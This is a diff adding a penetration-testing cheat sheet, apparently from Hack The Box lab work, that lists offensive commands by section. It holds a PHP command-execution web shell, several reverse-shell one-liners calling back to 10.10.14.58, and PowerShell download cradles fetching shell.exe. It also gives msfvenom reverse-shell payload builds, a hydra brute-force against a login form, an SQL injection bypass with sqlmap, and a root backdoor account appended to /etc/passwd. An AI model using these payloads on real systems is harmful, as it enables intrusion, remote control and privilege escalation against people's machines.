@@ -1,0 +1,72 @@
+USEFUL COMMANDS
+stty raw -echo
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+python -c 'import pty;pty.spawn("/bin/bash")'
+gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -k -u
+gobuster dir --help
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+LINPEAS
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
+
+REV SHELLS
+0<&196;exec 196<>/dev/tcp/10.10.14.58/5555; sh <&196 >&196 2>&196
+rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.58 5555 > /tmp/f
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.58",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
+
+BRUTEFORCE
+hydra nineveh.htb -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!"
+/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt
+
+BINWALK
+cd /tmp && git clone https://github.com/ReFirmLabs/binwalk && cd - && cd /tmp/binwalk && sudo ./setup.py install && cd -
+
+RBASH ESCAPE
+ssh <username>@<IP-Adress> -t "bash --noprofile"
+
+WINPEAS / WINDOWS
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
+wget http://blog.stackexchange.com/ -OutFile out.html
+powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c cd /d %CD% && %*'"
+powershell "IEX(New-Object Net.WebClient).DownloadFile('http://10.10.14.58:8080/shell.exe','shell.exe')"
+powershell Invoke-WebRequest -Uri http://10.10.14.58/shell.exe -OutFile out.yml
+(New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")
+Invoke-WebRequest "https://example.com/archive.zip" -OutFile "C:\Windows\Temp\archive.zip"
+C:\windows\syswow64\windowspowershell\v1.0\powershell
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell 
+smbclient -N -L \\\\10.10.10.27\\
+
+METASPLOIT HANDLER/PRIVESC
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.58 LPORT=6666 -f aspx -o revshell.aspx
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.58 LPORT=6666 -f exe > shell64.ex
+msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.14.98 LPORT=4444 -f elf > rev.elf
+use exploit/multi/handler
+UPGRADE: CTRL+Z, sessions -u 1
+set payload windows/meterpreter/reverse_tcp
+use post/multi/recon/local_exploit_suggester
+run -j
+background
+sessions -i 1
+ps
+migrate 1828
+
+WRITABLE /etc/passwd
+echo "toor1:aaKNIEDOaueR6:0:0:toor:/root:/bin/bash" >> /etc/passwd 
+Credentials "toor1/foo"
+
+COPY A FILE
+cat file.txt|xclip
+
+SSH
+ssh-keygen -f mykey
+cat mykey.pub # you can copy this to authorized_keys
+
+rev shell php worked with ext .htb (see html comment), user flag readable as www-data:
+848b16799025a2a389f0ebe25d531be6
+
+SQL INJECTIONS
+admin' or '1' = '1
+Copy to file login request from Burp name it "req"
+sqlmap -r req --risk=3 --level=3 --batch --force-ssl
+
+username: tony
